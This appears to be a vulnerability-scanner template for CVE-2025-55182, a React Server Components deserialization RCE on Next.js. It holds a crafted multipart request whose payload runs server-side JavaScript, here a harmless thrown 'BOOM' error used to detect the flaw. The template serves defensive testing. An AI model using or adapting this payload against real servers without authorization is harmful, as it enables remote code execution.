id: CVE-2025-55182

info:
  name: CVE-2025-55182 - React2shell Unauthenticated Remote Code Execution
  author: Jerome Fellus
  severity: critical
  description: |
    This probe sends a crafted multipart/form-data POST request to exploit React Server Components
    deserialization vulnerability to execute non-destructive JS code on a Next.js server.
    The payload is neutralized, thus safe to be used against production environments
    (it simply sends back a dumb exception message to the probe to assess vulnerability).
  reference:
    - https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
    - https://x.com/rauchg/status/1997362942929440937?s=46&t=JS55_O2JZmKWQpZHLAse_A
    - https://github.com/vercel-labs/fix-react2shell-next?tab=readme-ov-file
    - https://www.wiz.io/blog/nextjs-cve-2025-55182-react2shell-deep-dive
    - https://nvd.nist.gov/vuln/detail/CVE-2025-55182
    - https://www.cert.ssi.gouv.fr/alerte/CERTFR-2025-ALE-014/
  tags: cve,cve2025,rce,nextjs,multipart,critical,react2shell,react-server-components

http:
  - method: POST
    path:
      - "{{BaseURL}}"

    headers:
      Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150
      Next-Action: "x"

    body: |
      -----------------------------735323031399963166993862150
      Content-Disposition: form-data; name="0"

      {"status":"resolved_model","reason":0,"_response":{"_prefix":"throw Object.assign(new Error(), {digest:`BOOM`});","_formData":{"get":"$1:then:constructor"}},"then":"$1:then","value":"{\"then\":\"$B\"}"}
      -----------------------------735323031399963166993862150
      Content-Disposition: form-data; name="1"

      "$@0"
      -----------------------------735323031399963166993862150--

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "1:E"

      - type: word
        part: body
        words:
          - "BOOM"
